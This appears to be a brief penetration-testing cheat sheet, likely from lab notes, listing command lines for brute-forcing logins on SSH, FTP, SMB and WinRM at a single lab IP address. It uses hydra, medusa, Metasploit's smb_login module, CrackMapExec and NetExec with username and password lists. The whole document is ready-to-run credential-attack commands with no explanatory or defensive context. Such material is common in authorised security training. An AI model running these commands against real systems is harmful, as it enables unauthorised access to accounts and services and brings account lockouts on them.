# Network Services

## SSH

```shell
my@attack:~$ hydra "ssh://10.129.85.85" -s 22 -L usernames.txt -P passwords.txt
```

## FTP

```shell
my@attack:~$ medusa -M ftp -h "10.129.85.85" -n 2121 -U usernames.txt -P passwords.txt
```

## SMB

### Hydra

```shell
my@attack:~$ hydra "smb://10.129.85.85" -L usernames.txt -P passwords.txt
```

### Metasploit Framework

```shell
my@attack:~$ msfconsole -q
```

```shell
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE usernames.txt
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.129.85.85
msf6 auxiliary(scanner/smb/smb_login) > run
```

## WinRM

### CrackMapExec

```shell
my@attack:~$ sudo crackmapexec winrm 10.129.85.85 -u usernames.txt -p passwords.txt
```

### [NetExec](https://www.netexec.wiki/winrm-protocol/password-spraying)

```shell
my@attack:~$ sudo nxc winrm 10.129.85.85 -u usernames.txt -p passwords.txt
```
